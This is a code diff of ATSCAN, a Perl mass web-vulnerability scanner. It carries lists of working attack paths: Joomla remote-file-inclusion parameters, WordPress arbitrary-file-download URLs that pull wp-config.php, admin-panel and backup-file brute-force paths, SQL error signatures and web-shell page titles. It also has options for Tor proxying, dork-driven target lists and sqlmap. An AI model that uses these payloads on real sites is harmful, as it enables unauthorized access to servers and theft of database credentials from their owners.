"/administrator/components/com_jcs/views/list.user.sub.html.php?mosConfig_absolute_path=", "/administrator/components/com_jcs/views/reports.html.php?mosConfig_absolte_path=", "/administrator/components/com_joomla_flash_uploader/install.joomla_flash_uploader.php?mosConfig_absolute_path=", "/administrator/components/com_joomla_flash_uploader/uninstall.joomla_flash_uploader.php?mosConfig_absolute_path=", "/administrator/components/com_color/admin.color.php?mosConfig_live_site=", "/administrator/components/com_jjgallery/admin.jjgallery.php?mosConfig_absolute_path=", "/administrator/components/com_juser/xajax_functions.php?mosConfig_absolute_path=", "/index.php?option=com_sef&Itemid=&mosConfig.absolute.path=", "/index.php?option=com_adsmanager&mosConfig_absolute_path=", "/com_ponygallery/admin.ponygallery.html.php?mosConfig_absolute_path=", "/com_magazine_3_0_1/magazine.functions.php?config=", "/administrator/components/com_joomla-visites/core/include/myMailer.class.php?mosConfig_absolute_path=", "/administrator/components/com_universal/includes/config/config.html.php?mosConfig_absolute_path=", "/modules/mod_pxt_latest.php?GLOBALS[mosConfig_absolute_path]=");
 }
-
+############################################################################################################################################################################################
+############################################################################################################################################################################################
 #ADF WP WORDPRESS
 sub ADFWP {@ADFWP =("/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php",
 "/wp-content/force-download.php?file=../wp-config.php",
@@ -236,21 +270,39 @@ sub ADFWP {@ADFWP =("/wp-admin/admin-ajax.php?action=revslider_show_image&img=..
 "/wp-content/plugins/aspose-doc-exporter/aspose_doc_exporter_download.php?file=../../../wp-config.php",
 "/wp-content/plugins/aspose-cloud-ebook-generator/aspose_posts_exporter_download.php?file=../../../wp-config.php");
 }
-
+############################################################################################################################################################################################
+############################################################################################################################################################################################
 sub ADMIN {@ADMIN=("/admin/", "/myadmin/", "/acceso/", "/administrator/", "/admin1/", "/admin2/", "/admin3/", "/admin4/", "/admin5/", "/usuarios/", "/usuario/", "/administrador/", "/administrateur/", "/moderator/", "/webadmin/", "/adminarea/", "/bb-admin/", "/adminLogin/", "/admin_area/", "/panel-administracion/", "/instadmin/", "/memberadmin/", "/administratorlogin/", "/adm/", "/wp-login.php", "/admin/account.php", "/admin/index.php", "/admin/login.php", "/admin/admin.php", "/admin/account.php", "/admin_area/admin.php", "/admin_area/login.php", "/siteadmin/login.php", "/siteadmin/index.php", "/siteadmin/login.html", "/admin/account.html", "/admin/index.html", "/admin/login.html", "/admin/admin.html", "/admin_area/index.php", "/bb-admin/index.php", "/bb-admin/login.php", "/bb-admin/admin.php", "/admin/home.php", "/admin_area/login.html", "/admin_area/index.html", "/admin/controlpanel.php", "/admin.php", "/admincp/index.asp", "/admincp/login.asp", "/admincp/index.html", "/admin/account.html", "/administracion", "/adminpanel.html", "/webadmin.html", "/webadmin/index.html", "/webadmin/admin.html", "/webadmin/login.html", "/admin/admin_login.html", "/admin_login.html", "/panel-administracion/login.html", "/admin/cp.php", "/cp.php", "/administrator/index.php", "/administrator/login.php", "/nsw/admin/login.php", "/webadmin/login.php", "/admin/admin_login.php", "/admin_login.php", "/administrator/account.php", "/administrator.php", "/admin_area/admin.html", "/pages/admin/admin-login.php", "/admin/admin-login.php", "/admin-login.php", "/bb-admin/index.html", "/bb-admin/login.html", "/acceso.php", "/bb-admin/admin.html", "/admin/home.html", "/login.php", "/modelsearch/login.php", "/moderator.php", "/moderator/login.php", "/moderator/admin.php", "/account.php", "/pages/admin/admin-login.html", "/admin/admin-login.html", "/admin-login.html", "/controlpanel.php", "/admincontrol.php", "/admin/adminLogin.html", "/adminLogin.html", "/admin/adminLogin.html", "/home.html", "/rcjakar/admin/login.php", "/adminarea/index.html", "/adminarea/admin.html", "/webadmin.php", "/webadmin/index.php", "/webadmin/admin.php", "/admin/controlpanel.html", "/admin.html", "/admin/cp.html", "cp.html", "/adminpanel.php", "/moderator.html", "/administrator/index.html", "/administrator/login.html", "/user.html", "/administrator/account.html", "/administrator.html", "/login.html", "/modelsearch/login.html", "/moderator/login.html", "/adminarea/login.html", "/panel-administracion/index.html", "/panel-administracion/admin.html", "/modelsearch/index.html", "/modelsearch/admin.html", "/admincontrol/login.html", "/adm/index.html", "adm.html", "/moderator/admin.html", "/user.php", "account.html", "/controlpanel.html", "/admincontrol.html", "/panel-administracion/login.php", "/wp-login.php", "/adminLogin.php", "/admin/adminLogin.php", "/home.php", "/admin.php", "/adminarea/index.php", "/adminarea/admin.php", "/adminarea/login.php", "/panel-administracion/index.php", "/panel-administracion/admin.php", "/modelsearch/index.php", "/modelsearch/admin.php", "/admincontrol/login.php", "/adm/admloginuser.php", "/admloginuser.php", "/admin2.php", "/admin2/login.php", "/admin2/index.php", "/usuarios/login.php", "/adm/index.php", "/adm.php", "/affiliate.php", "/adm_auth.php", "/memberadmin.php", "/administratorlogin.php");
 }
-
+############################################################################################################################################################################################
+############################################################################################################################################################################################
 sub SUBDOMAIN {@SUBDOMAIN =("about.", "abose.", "acme.", "ad.", "admanager.", "admin.", "admins.", "administrador.", "administrateur.", "administrator.", "ads.", "adsense.", "adult.", "adwords.", "affiliate.", "affiliatepage.", "afp.", "analytics.", "android.", "shop.", "echop.", "blog.", "tienda.", "answer.", "ap.", "api.", "apis.", "app.", "bank.", "blogs.", "client.", "clients.", "community.", "content.", "cpanel.", "dashbord.", "data.", "developer.", "developers.", "dl.", "docs.", "documents.", "download.", "downloads.", "encrypted.", "email.", "webmail.", "mail.", "correo.", "ftp.", "forum.", "forums.", "feed.", "feeds.", "file.", "files.", "gov.", "home.", "help.", "invoice.", "invoises.", "items.", "js.", "es.", "it.", "en.", "fr.", "ar.", "legal.", "iphone.", "lab.", "labs.", "list.", "lists.", "log.", "logs.", "errors.", "net.", "mysql.", "mysqldomain.", "net.", "network.", "news.", "ns.", "ns1.", "ns2.", "ns3.", "ns4.", "ns5.", "org.", "panel.", "partner.", "partners.", "pop.", "pop3.", "private.", "proxies.", "public.", "reports.", "root.", "rss.", "prod.", "prods.", "sandbox.", "search.", "server.", "servers.", "signin.", "signup.", "login.", "smtp.", "srntp.", "ssl.", "soap.", "stat.", "statics.", "store.", "status.", "survey.", "sync.", "system.", "text.", "test.", "webadmin.", "webdisk.", "xhtml.", "xhtrnl.", "xml.");
 }
-
+############################################################################################################################################################################################
+############################################################################################################################################################################################
 sub UPLOAD {@UPLOAD = ("/up.php", "/up1.php", "up/up.php", "/site/up.php", "/vb/up.php", "/forum/up.php", "/blog/up.php", "/upload.php", "/upload1.php", "/upload2.php", "/vb/upload.php", "/forum/upload.php", "blog/upload.php", "site/upload.php", "download.php");
 }
-
+############################################################################################################################################################################################
+############################################################################################################################################################################################
 sub ZIP {@ZIP = ("/backup.tar.gz", "/backup/backup.tar.gz", "/backup/backup.zip", "/vb/backup.zip", "/site/backup.zip", "/backup.zip", "/backup.rar", "/backup.sql", "/vb/vb.zip", "/vb.zip", "/vb.sql", "/vb.rar", "/vb1.zip", "/vb2.zip", "/vbb.zip", "/vb3.zip", "/upload.zip", "/up/upload.zip", "/joomla.zip", "/joomla.rar", "/joomla.sql", "/wordpress.zip", "/wp/wordpress.zip", "/blog/wordpress.zip", "/wordpress.rar");
 }
-
-###################################################################		
-###################################################################		
+############################################################################################################################################################################################
+############################################################################################################################################################################################
+my @browserlangs=('fr', 'it', 'ie', 'us', 'br', 'ma', 'dz', 'se', 'nl', 'il', 'ca', 'pt', 'pl', 'eg', 'tn', 'ae', 'qa', 'af', 'iq', 'ch', 'mx', 've', 'es', 'ro', 'ru', 'jp', 'id', 'de', 'ua', 'sa', 'ok', 'fi', 'no', 'cz', 'lu', 'uy');
+############################################################################################################################################################################################
+############################################################################################################################################################################################
+my @ERROR = ("root:x", "You have an error in your SQL syntax", "Warning: mysql", "ORA-", "Oracle ODBC", "Oracle Error", "Oracle Driver", "Oracle DB2", "error ORA-", "SQL command not properly ended", "DB2 ODBC", "DB2 error", "DB2 Driver", "ODBC SQL", "ODBC DB2", "ODBC Driver", "ODBC Error", "ODBC Microsoft Access", "ODBC Oracle", "ODBC Microsoft Access Driver", "Warning: pg_", "PostgreSql Error:", "Supplied argument is not a valid PostgreSQL result", "function.mysql", "MySQL result index", "MySQL Error", "MySQL ODBC", "PostgreSQL query failed: ERROR: parser: parse error", "Warning: sybase_", "function.sybase", "Sybase result index", "Sybase Error:", "Sybase: Server message:", "ODBC Driver:",  "Database Query", "SQLServer JDBC Driver", "JDBC SQL", "JDBC Oracle", "JDBC MySQL", "JDBC error", "JDBC Driver", "java.io.IOException: InfinityDB", "Warning: include", "Warning: require", "Fatal error: require", "ADODB_Exception", "Warning: include", "Warning: require_once", "function.include", "EDisallowed Parent Path", "function.require","MySQL Driver", "mysqli.query", "num_rows", "mysql error:", "supplied argument is not a valid MySQL result resource", "Error Executing Database Query", "mysql_fetch_assoc", "Warning: main", "Warning: session_start", "Warning: getimagesize", "Warning: array_merge", "Warning: preg_match", "GetArray", "EFetchRow", "Warning: preg_", "Warning: ociexecute", "Warning: ocifetchstatement", "PHP Warning:", "Version Information: Microsoft .NET Framework", "Server.Execute Error", "ASP.NET_SessionId", "ASP.NET is configured to show verbose error messages", "BOF or EOF", "Unclosed quotation mark", "Error converting data type varchar to numeric", "LuaPlayer ERROR:", "CGILua message", "ELua error", "Incorrect syntax near", "Fatal error", "Invalid Querystring", "An illegal character has been found in the statement", "<title>Shell</title>", "<title>(.*)Shell</title>", "<title>(.*)Shell(.*)</title>", "<title>(.*)r57shell(.*)</title>", "Hacked by", "backdoor by", "<title>(.*)C99Shell(.*)</title>");
+############################################################################################################################################################################################
+############################################################################################################################################################################################
+@JOOMCMS = ("/administrator/index.php");
+############################################################################################################################################################################################
+############################################################################################################################################################################################
+@WPCMS = ("/wp-login.php");
+############################################################################################################################################################################################
+############################################################################################################################################################################################
+my @MODULETYPE = ("<a href=\"https:\/\/wordpress.org\/\">Proudly powered by WordPress", "<meta name=\"generator\" content=\"Joomla", "Powered by <a href=\"http:\/\/www.textpattern.com\" title=\"Textpattern", "<a href=\"http:\/\/www.simplemachines.org/about/copyright.php\" title=\"Free Forum Software\" target=\"_blank\">SMF", "Powered by <a href=\"http:\/\/www.phpbb.com/\">phpBB", "<a href=\"https:\/\/www.vbulletin.com\" id=\"vbulletinlink\">vBulletin", "vBulletin Solutions\, Inc\. All rights reserved", "Powered By <a href=\"http:\/\/www.mybboard.net\" target=\"_blank\">MyBB", "<a href=\"http:\/\/www.cloudflare.com\/\" target=\"_blank\" style", "DDoS protection by CloudFlare", "name=\"Generator\" content=\"Drupal", "<meta name=\"generator\" content=\"PostNuke", "<a href=\"/about.php\">About ATutor", "<META NAME=\"GENERATOR\" CONTENT=\"PHP-Nuke", "Powered by <a href=\"http:\/\/moodle.org\" title=\"Moodle\">Moodle", "<meta name=\"key words\" content=\"moodle", "Powered by <a href=\"http:\/\/www.adaptcms.com\">AdaptCMS", "<meta name=\"generator\" content=\"SilverStripe - http:\/\/silverstripe.org\" \/>", "<a href=\"http:\/\/www.modx.com\" target=\"_blank\"> Powered by MODx", "<meta name=\"generator\" content=\"XOOPS", "Powered by osCommerce", "<a href=\"http:\/\/www.oscommerce.com\" target=\"_blank\">osCommerce", "<a class=\"_blank_blank\" href=\"http:\/\/www.prestashop.com\" target=\"_blank", "Software para Ecommerce de PrestaShop", "<meta name=\"generator\" content=\"b2evolution", "MAGENTO\, INC\. ALL RIGHTS RESERVED", "Magento Ecommerce by Smart Solutions", "all rights reserved Zen Cart", "<a href=\"http:\/\/www.zen-cart.com\" target=\"_blank\">Zen Cart", "Powered by concrete5", "<meta name=\"generator\" content=\"concrete", "Powered By OpenCart");
+############################################################################################################################################################################################
+############################################################################################################################################################################################
 use Getopt::Long ();
 my $proxy;
 my $help;
@@ -282,7 +334,6 @@ my $mwpsites;
 my $mjoomsites;
 my $mupload;
 my $mzip;
-my $mhttpd;
 my $command;
 my $mtarget;
 my $misup;
@@ -291,10 +342,7 @@ my $checkversion;
 my $mmd5;
 my $mencode64;
 my $mdecode64;
-my $mip;
-my $mserver;
 my $mmails;
-my $mnoshow;
 
 Getopt::Long::GetOptions(\my %OPT,
                         'proxy=s' => \$proxy,
@@ -326,7 +374,6 @@ Getopt::Long::GetOptions(\my %OPT,
 						'zip' => \$mzip,
 						'encode64' => \$mencode64,
 						'decode64' => \$mencode64,
-						'httpd' => \$mhttpd,
 						'command=s' => \$command,
 						'TARGET' => \$mtarget,
 						'FULL_TARGET' => \$mfulltarget,
@@ -337,10 +384,8 @@ Getopt::Long::GetOptions(\my %OPT,
 						'md5=s' => \$mmd5,
 						'encode64=s' => \$mencode64,
 						'decode64=s' => \$mdecode64,
-						'ip' => \$mip,
-						'server' => \$mserver,
 						'email' => \$mmails,
-						'hide' => \$mnoshow,
+						'update' => \$checkversion,
 ) or advise();
 
 if (@ARGV > 0){
@@ -375,7 +420,6 @@ if (@ARGV > 0){
 			'encode64',
 			'decode64',
 			'md5',
-			'httpd',
 			'command',
 			'TARGET',
 			'FULL_TARGET',
@@ -384,116 +428,102 @@ if (@ARGV > 0){
 			'select',
 			'replace',
 			'with',
-			'ip',
-			'server',
 			'email',
-			'hide',
+			'update',
   );
   
-  if (!exists $com{"save" || "help" || "proxy" || "dork" || "level" || "xss" || "valid" || "exp" || "sqlmap" || "lfi" || "joomrfi" || "shell" || "wpadf" || "admin" || "shost" || "ports" || "start" || "end" || "basic" || "all" || "sites" || "wp" || "joom" || "zip" || "upload" || "md5" || "decode64" || "encode64" || "httpd" || "command" || "TARGET" || "FULL_TARGET" || "isup" || "about" || "select" || "replace" || "ip" || "server" || "with" || "email" || "hide"}) {
+  if (!exists $com{"save" || "help" || "proxy" || "dork" || "level" || "xss" || "valid" || "exp" || "sqlmap" || "lfi" || "joomrfi" || "shell" || "wpadf" || "admin" || "shost" || "ports" || "start" || "end" || "basic" || "all" || "sites" || "wp" || "joom" || "zip" || "upload" || "md5" || "decode64" || "encode64" || "command" || "TARGET" || "FULL_TARGET" || "isup" || "about" || "select" || "replace" || "with" || "email" || "update"}) {
 	advise();
   }
 }
-##############################################################
+############################################################################################################################################################################################
+############################################################################################################################################################################################
 ### set tor proxy
 if (defined $proxy) {
   my $proxy=$proxy;
   $ua->proxy([qw/ http https /] => $proxy);
   $ua->cookie_jar({});
 }
-##############################################################
+############################################################################################################################################################################################
+############################################################################################################################################################################################
+sub existantversion {
+  $existantversion='version 6.0 Stable';
+  return $existantversion;
+}
+############################################################################################################################################################################################
+############################################################################################################################################################################################
 sub checkversion {
-  $versionck = "version.log";
-  if (!-e $versionck) {
-    print color 'red';
-	print "version.log not exists cannot check version! \n";
+  testconection();
+  existantversion();
+  my $URL = 'https://github.com/AlisamTechnology/ATSCAN/blob/master/version.log';
+  $request = HTTP::Request->new('GET', $URL);
+  my $response = $ua->request($request);
+  my $html = $response->content;
+  (my $gitversion) = ($html =~ /version(.*)Stable/);
+  print color 'bold';
+  print "[ ] ----------------------------------------------------------------------- [ ]\n";
+  print color RESET;
+  $gitversion = "version".$gitversion."Stable";
+  if ($gitversion eq $existantversion) {
+	print color 'green';
+	print "[!] OK! Last $gitversion!\n";
 	print color RESET;
-  }else{
-    my $URL = 'https://github.com/AlisamTechnology/ATSCAN/blob/master/version.log';
-    $request = HTTP::Request->new('GET', $URL);
-    my $response = $ua->request($request);
-	my $html = $response->content;
-	  
-    (my $gitversion) = ($html =~ /version(.*)Stable/);
-	if (defined $gitversion) {
-      $gitversion = "version".$gitversion."Stable";
-    }
-    open (TEXT, 'version.log');
-    while (my $existantversion = <TEXT>) { 
-	  chomp $existantversion;
-	  if (defined $gitversion) {
-	    if ($gitversion eq $existantversion) {
-	      print color 'green';
-	      print "OK! Last $gitversion!\n";
-	      print color RESET;
-	    }else{
-	      print color 'red';
-	      print "$existantversion Update Needed to ";
-	      print color RESET;
-	      print color 'green';
-	      print "$gitversion!\n";
-	      print color RESET;
-		}  
-	  }
-    }
-    close (TEXT);
+  }else{	
+	print color 'red';
+	print "[!] $existantversion Update Needed to ";
+	print color RESET;
+	print color 'green';
+	print "$gitversion!\n";
+	print color RESET;
   }
 }
-###################################################################
-###################################################################		
-sub desclaimer {
-  print "[ ] ----------------------------------------------------------------------- [ ]\n";
-  print "[ ] This is a pentest tool! We will not be responsible or liable, directly  [ ]\n";
-  print "[ ]    or indirectly in any way for any loss or damage of any kind          [ ]\n";
-  print "[ ]                incurred as result of our program use !!                 [ ]\n";
-  print "[ ] ----------------------------------------------------------------------- [ ]\n";
-  osinfo();
-}
-###################################################################		
-###################################################################		
+############################################################################################################################################################################################
+############################################################################################################################################################################################
 sub timer {
   my ($sec,$min,$hr) = localtime();
   print "[!] [";
   print "$hr:$min:$sec";
   print "] ";
 }
-###################################################################		
+############################################################################################################################################################################################
+############################################################################################################################################################################################
 sub osinfo {
   use Config;
   print color 'bold yellow';
   print "[+] GROUP:: ";
   print color RESET;
-  print color 'red';
+  print color 'cyan';
   print "ALISAM TECHNOLOGY SCANNER\n";
   print color RESET;
   print color 'bold yellow';
   print "[+] TOOL:: ";
   print color RESET;
-  print color 'red';
-  print "ATSCAN ";
+  print color 'cyan';
+  existantversion();
+  print "ATSCAN $existantversion\n";
   print color RESET;
-  checkversion();
   print color 'bold yellow';
   print "[+] PATH:: ";
   print color RESET;
-  print color 'red';
+  print color 'cyan';
   print "$Bin/",basename($0)," \n";
   print color RESET;
   print color 'bold yellow';
   print "[+] PERL VERSION:: ";
   print color RESET;
-  print color 'red';
+  print color 'cyan';
   print "$^V \n";
   print color RESET;
   print color 'bold yellow';
   print "[+] PLATFORM:: ";
   print color RESET;
-  print color 'red';
+  print color 'cyan';
   print "$Config{osname} ";
   print "$Config{archname}\n";
   print color RESET;
 }
-###################################################################		
+############################################################################################################################################################################################
+############################################################################################################################################################################################
 sub advise {
   print color 'bold';
   print "[ ] ----------------------------------------------------------------------- [ ]\n";
@@ -506,7 +536,8 @@ sub advise {
   print color RESET;
   exit;
 }
-###################################################################		
+############################################################################################################################################################################################
+############################################################################################################################################################################################
 sub forwait {
   print color RESET;
   print color 'bold';
@@ -519,7 +550,8 @@ sub forwait {
   progressbar();
   print color RESET;
 }
-###################################################################		
+############################################################################################################################################################################################
+############################################################################################################################################################################################
 sub progressbar {
   use utf8;
   $| = 1;
@@ -532,20 +564,23 @@ sub progressbar {
   }
   print" \n\n";
 }
-###################################################################		
+############################################################################################################################################################################################
+############################################################################################################################################################################################
 sub scandetail {
   if (defined $Target) {
     print color 'bold yellow';
     print "[!] TARGET:: ";
     print color RESET;
-    print color 'red';
+    print color 'cyan';
     print "$Target ";
 	if (($Target =~ m/.txt/i) || ($Target=~ m/.log/i)){
 	  countinicialtargets();
     }
 	print "\n";
     print color RESET;
-  }  
+  }
+  #########################################
+  #########################################
   print color 'bold yellow';
   print "[+] PROXY:: ";
   print color RESET;
@@ -554,129 +589,127 @@ sub scandetail {
     print "Yes! \n";
     print color RESET;
   }else{
-    print color 'red';
+    print color 'cyan';
     print "No! \n";
     print color RESET;
   }
+  #########################################
   #########################################
   if ((defined $misup) || (defined $validation_text)) {
     print color 'bold yellow';
     print "[+] VALIDATION:: ";
     print color RESET;
-    print color 'red';
+    print color 'cyan';
     if (defined $validation_text) { 
       print "$validation_text ";
     }
     if (defined $misup) { 
-      print "HTTP/1.1 200 ";
+      print "/HTTP/1.1 200 ";
     }
-    if (defined $noshow) { 
-      print "Hide Process ";
+    if (defined $mnoshow) { 
+      print "/Hidden Process ";
     }
     print color RESET;
     print "\n";
   }
-  
+  #########################################
+  #########################################
   if ((defined $mmd5) || (defined $mdecode64) || (defined $mencode64) || (defined $mtarget) || (defined $mfulltarget) || (defined $exploit) || (defined $replace)) {
     print color 'bold yellow';
     print "[+] EXPLOITATION:: ";
     print color RESET;
-    print color 'red';
+    print color 'cyan';
 	if (defined $mmd5) {
       print "MD5 ";
 	}
 	if (defined $mencode64) {
-      print "Encode Base64 ";
+      print "/Encode Base64 ";
 	}
 	if (defined $mdecode64) {
-      print "Decode Base64 ";
+      print "/Decode Base64 ";
 	}
     if (defined $mtarget) {
-      print "Remove parameters ";
+      print "/Remove parameters ";
     }
 	if ((defined $replace) && (defined $with)){
-      print "Replace  ";
+      print "/Replace  ";
 	}
     if (defined $exploit){
-      print "Exploit ";
+      print "/Exploit ";
     }
     if (defined $mfulltarget){
-      print "All parameters ";
+      print "/All parameters ";
     }
     print color RESET;
     print "\n";
   }
+  #########################################
+  #########################################
   if ((defined $mxss) || (defined $mlfi) || (defined $madmin) || (defined $mjoomrfi) || (defined $mwpadf) || (defined $mports) || (defined $mupload) || (defined $mzip) || (defined $mmails)){
     print color 'bold yellow';
     print "[+] SCAN:: ";
     print color RESET;
-	
-    print color 'red';
+    print color 'cyan';
 	if (defined $mxss) {
-      print "Xss ";
+      print "/Xss ";
     }
     if (defined $mlfi) {
-      print "Lfi ";
+      print "/Lfi ";
     }
     if (defined $madmin) {
-      print "Admin ";
+      print "/Admin ";
     }
     if (defined $mjoomrfi) {
-      print "Rfi ";
+      print "/Rfi ";
     }
     if (defined $mwpadf) {
-      print "Adf ";
+      print "/Adf ";
     }
     if (defined $mports) {
-      print "Ports ";
+      print "/Ports ";
     }
     if (defined $mupload) {
-      print "Upload ";
+      print "/Upload ";
     }
     if (defined $mzip) {
-      print "Zip ";
+      print "/Zip ";
     }
     if (defined $mmails) {
-      print "E-mails ";
+      print "/E-mails ";
     }
     print color RESET;
 	print "\n";
-  }  
-  if ((defined $mhttpd) || (defined $msites) || (defined $mwpsites) || (defined $mjoomsites) || (defined $msubdomain) || (defined $mip) || (defined $mserver)){
+  } 
+  #########################################
+  #########################################
+  if ((defined $msites) || (defined $mwpsites) || (defined $mjoomsites) || (defined $msubdomain)){
     print color 'bold yellow';
     print "[+] GET:: ";
     print color RESET;
-    print color 'red';
-    if (defined $mhttpd) { 
-      print "Httpd Headers ";
-    }
+    print color 'cyan';
     if (defined $msites) { 
-      print "Server sites ";
+      print "/Server sites ";
     }
     if (defined $mwpsites) { 
-      print "WP sites ";
+      print "/WP sites ";
     }
     if (defined $mjoomsites) { 
-      print "JOOM sites ";
+      print "/JOOM sites ";
     }
     if (defined $msubdomain) { 
-      print "Subdomains ";
-    }
-    if (defined $mip) { 
-      print "IP ";
-    }
-    if (defined $mserver) { 
-      print "Server ";
+      print "/Subdomains ";
     }
     print color RESET;
 	print "\n";
   }
 }
+############################################################################################################################################################################################
+############################################################################################################################################################################################
 if (defined $shell) {
   print color 'bold yellow';
   print "[+] SHELL:: ";
   print color RESET;
-  print color 'red';
+  print color 'cyan';
   print "$shell \n";
   print color RESET;
 }
@@ -684,7 +717,7 @@ if (defined $mlevel) {
   print color 'bold yellow';
   print "[+] SCAN LEVEL:: ";
   print color RESET;
-  print color 'red';
+  print color 'cyan';
   print "$mlevel \n";
   print color RESET;
 }
@@ -692,18 +725,26 @@ if ((defined $command) || (defined $sqlmap)){
   print color 'bold yellow';
   print "[+] EXTERN CMD:: ";
   print color RESET;
-  print color 'red';
+  print color 'cyan';
   if (defined $command){
-    print "External Command ";
+    print "/External Command ";
   }
   if (defined $sqlmap){
-    print "Sqlmap ";
+    print "/Sqlmap ";
   }
   print "\n";
   print color RESET;
 }
-
-##############################################################
+if (defined $output) {
+  print color 'bold yellow';
+  print "[+] OUTPUT:: ";
+  print color RESET;
+  print color 'cyan';
+  print "$output\n";
+  print color RESET;
+}
+############################################################################################################################################################################################
+############################################################################################################################################################################################
 sub testconection {
   my $URL = "http://www.google.com";
   $request = HTTP::Request->new('GET', $URL);
@@ -719,19 +760,23 @@ sub testconection {
 	exit();
   }
 }
-###################################################################		
+############################################################################################################################################################################################
+############################################################################################################################################################################################
 sub dorklist {
   $checkdorklist = "dorks.txt";
   if (-e $checkdorklist){ unlink 'dorks.txt'};
   if (defined $dork){
     my $pattern = '.txt|.log';
     if ($dork =~ m/$pattern/i) {
-	  if (!-e $dork) {
-	    print "[ ] ----------------------------------------------------------------------- [ ]\n";
-        print color 'red';
-	    print "[!] $dork not exists! make sure it is in the top tool directory! \n";
+      if ($dork =~ m/dorks.txt/i ) {
 	    print color RESET;
-		exit();
+        print color 'bold';
+        print "\n[ ] ----------------------------------------------------------------------- [ ]\n";
+	    print color RESET;
+	    print color 'red';
+	    print "[!] Rename your list [$dork] I use the same name!\n";
+	    print color RESET;
+	    exit();
       }
 	  use File::Copy qw(copy);
 	  copy $dork, 'dorks.txt';
@@ -752,12 +797,15 @@ sub dorklist {
 	if (-e 'dorks.txt'){ unlink 'dorks.txt'};
     my $pattern = '.txt|.log';
     if ($Target =~ m/$pattern/i) {
-	  if (!-e $Target) {
-	    print "[ ] ----------------------------------------------------------------------- [ ]\n";
-        print color 'red';
-	    print "[!] $Target not exists!make sure it is in the top tool directory! \n";
+      if ($Target =~ m/dorks.txt/i ) {
 	    print color RESET;
-		exit();
+        print color 'bold';
+        print "\n[ ] ----------------------------------------------------------------------- [ ]\n";
+	    print color RESET;
+	    print color 'red';
+	    print "[!] Rename your list [$dork] I use the same name!\n";
+	    print color RESET;
+	    exit();
       }
 	  use File::Copy qw(copy);
 	  copy $Target, 'dorks.txt';
@@ -776,16 +824,21 @@ sub dorklist {
     }
   }
 }
+############################################################################################################################################################################################
+############################################################################################################################################################################################
 sub targetlist {
   if (defined $Target) {
     my $pattern = '.txt|.log';
     if ($Target =~ m/$pattern/i) {
-	  if (!-e $Target) {
-	    print "[ ] ----------------------------------------------------------------------- [ ]\n";
-        print color 'red';
-	    print "[!] $Target not exists!make sure it is in the top tool directory! \n";
+      if ($Target =~ m/search.txt/i ) {
 	    print color RESET;
-		exit();
+        print color 'bold';
+        print "\n[ ] ----------------------------------------------------------------------- [ ]\n";
+	    print color RESET;
+	    print color 'red';
+	    print "[!] Rename your list [$Target] I use the same name!\n";
+	    print color RESET;
+	    exit();
       }
 	  use File::Copy qw(copy);
 	  copy $Target, 'search.txt';
@@ -805,7 +858,8 @@ sub targetlist {
     }
   }
 }
-###################################################################	
+############################################################################################################################################################################################
+############################################################################################################################################################################################
 sub checkurltype{
   $URL=$_[0];
   if ($URL=~m/(\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3})/ && ($1<=255 && $2<=255 && $3<=255 && $4<=255 )){
@@ -818,8 +872,8 @@ sub checkurltype{
     return $URL;
   }
 }	
-###################################################################	
-###################################################################	
+############################################################################################################################################################################################
+############################################################################################################################################################################################
 sub checkip{
   $URL=$_[0];
   if ($URL!~m/(\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3})/ && ($1<=255 && $2<=255 && $3<=255 && $4<=255 )){
@@ -832,30 +886,52 @@ sub checkip{
     return $URL;
   }
 }	
-###################################################################		
-	
+############################################################################################################################################################################################
+############################################################################################################################################################################################
 sub countdorks {
   my $lc = 0;
   my $file = $dork;
+  if (!-e $dork) {
+	print color RESET;
+    print color 'bold';
+    print "\n[ ] ----------------------------------------------------------------------- [ ]\n";
+	print color RESET;
+	print color 'red';
+	print "[!] Dont make me crazy! NO $dork found!\n";
+	print color RESET;
+	exit();
+  }
   open $file, "<", $dork;
   $lc++ while <$file>;
-  print color 'red';
+  print color 'cyan';
   print "[$lc Dorks(s) Found in the List!]\n";
   print color RESET;
   close $file;
 }
-###################################################################		
+############################################################################################################################################################################################
+############################################################################################################################################################################################
 sub countinicialtargets {
   my $lc = 0;
   my $file = $Target;
+  if (!-e $Target) {
+	print color RESET;
+    print color 'bold';
+    print "\n[ ] ----------------------------------------------------------------------- [ ]\n";
+	print color RESET;
+	print color 'red';
+	print "[!] Dont make me crazy! NO $Target found!\n";
+	print color RESET;
+	exit();
+  }
   open $file, "<", $Target;
   $lc++ while <$file>;
-  print color 'red';
+  print color 'cyan';
   print "[$lc Target(s) Found in the List!]";
   print color RESET;
   close $file;
 }
-###################################################################		
+############################################################################################################################################################################################
+############################################################################################################################################################################################
 sub countsqllist {
   my $lc = 0;
   open $file, "<", "scan.txt";
@@ -864,8 +940,8 @@ sub countsqllist {
   close $file;
 }
 
-###################################################################
-###################################################################		
+############################################################################################################################################################################################
+############################################################################################################################################################################################
 sub countsearchlist {
   my $lc = 0;
   open $file, "<", "search.txt";
@@ -873,8 +949,8 @@ sub countsearchlist {
   print "$lc"; 
   close $file;
 }
-
-###################################################################
+############################################################################################################################################################################################
+############################################################################################################################################################################################
 sub control {
   $URL=$_[0];
   if (defined $mfulltarget) {
@@ -885,7 +961,7 @@ sub control {
   }
   if ((defined $replace) && (defined $with)) {
     if ($URL =~ m/$replace/i) {
-	  $URL =~ s/$replace(.*)/$with/s;
+	  $URL =~ s/$replace(.*)/$with/g;
 	}
   }
   if (defined $exploit) {
@@ -894,12 +970,166 @@ sub control {
   $URL =~ s/ //g;
   return $URL;
 }	
-###################################################################	
+############################################################################################################################################################################################
+############################################################################################################################################################################################
 sub getlist {
   if (defined $output) { my $output = $output;}
   else{ my $output = "scan.txt"; }
 }
-###################################################################
+############################################################################################################################################################################################
+############################################################################################################################################################################################
+sub checkextrainfo {
+  my $checkip=$URL1;	 
+  if (index($checkip, 'http://') != -1) {
+	$checkip =~ s/http:\/\///g;
+  }
+  use Socket;
+  $checkip=~ s/\/.*//s;
+  $ip = Socket::inet_ntoa(inet_aton($checkip));
+  print color 'bold';
+  print "    IP:     ";
+  print color RESET;
+  print "$ip\n";
+
+  if ((defined $replace) && (defined $with)) {
+	print color 'bold';
+	print "    REPLC:  ";
+	print color RESET;
+	print "[$replace] => [$with]\n";
+  }
+  if (defined $exploit) {
+	print color 'bold';
+	print "    EXPL:   ";
+	print color RESET;
+    print "$exploit\n";
+  }
+}
+############################################################################################################################################################################################
+############################################################################################################################################################################################
+sub checkedurl {
+  $request = HTTP::Request->new('GET', $URL1);
+  my $response = $ua->request($request);
+  my $html = $response->content;
+  my $status = $response->code;
+  my $serverheader = $response->server;
